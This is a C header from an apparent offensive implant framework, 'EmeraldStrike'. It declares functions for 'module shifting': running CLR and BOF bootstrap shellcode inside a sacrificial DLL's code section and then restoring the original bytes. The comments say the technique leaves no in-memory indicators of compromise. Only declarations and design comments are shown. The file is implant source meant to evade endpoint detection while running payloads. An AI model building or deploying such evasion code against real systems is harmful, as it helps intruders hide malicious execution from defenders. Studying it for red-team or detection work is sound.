/*
    EmeraldStrike - Module Shifting (naksyn ModuleShifting)

    Shift-and-restore execution for fork-and-run bootstrap shellcode
    (CLR/BOF bootstraps): the bootstrap is written into a sacrificial DLL's
    .text section, executed in-process, and the original section bytes are
    restored afterwards - leaving zero residual artifacts in memory.

    Unlike the persistent module stomp (module_stomp.cc) this is transient:
    write, execute, restore. No Modified-Code IoC survives the run.

    x64 only. Gated by INCLUDE_EVASION_MODULE_SHIFT (implies
    INCLUDE_EVASION_MODULE_STOMP, whose shared sacrifice loader it reuses).
*/

#ifndef EMERALDSTRIKE_MODULE_SHIFT_H
#define EMERALDSTRIKE_MODULE_SHIFT_H

#ifdef INCLUDE_EVASION_MODULE_SHIFT
#ifdef _WIN64

#include "evasion/module_stomp.h"

// Run a PIC bootstrap shellcode inside a shifted sacrifice-DLL section:
// load sacrifice, VirtualProtect RW, back up, copy shellcode in, protect
// back to the section's original protection, call the entry with `param`,
// then restore the original bytes and free the backup.
// Returns the bootstrap's return code, or (DWORD)-1 on failure.
DWORD module_shift_exec(PINSTANCE inst, BYTE* shellcode, DWORD len, PVOID param);

// execute_assembly via module shifting: builds the same data region the
// fork-and-run path builds (asm_len/args_len/pipe/asm/args), runs the CLR
// bootstrap shifted in-process, and drains the pipe. Returns FALSE (caller
// falls back to the remote fork path) if no CLR stub was built or the
// shift failed.
BOOL module_shift_run_assembly(PINSTANCE inst,
                               BYTE* asm_data, DWORD asm_len,
                               const char* args_str, DWORD args_len,
                               BYTE** output, DWORD* output_len);

// inline_execute (BOF) via module shifting: same as above with the
// BOF bootstrap and its COFF data layout.
BOOL module_shift_run_bof(PINSTANCE inst,
                          BYTE* bof_data, DWORD bof_len,
                          BYTE* bof_args, DWORD bof_args_len,
                          BYTE** output, DWORD* output_len);

#endif // _WIN64
#endif // INCLUDE_EVASION_MODULE_SHIFT

#endif // EMERALDSTRIKE_MODULE_SHIFT_H
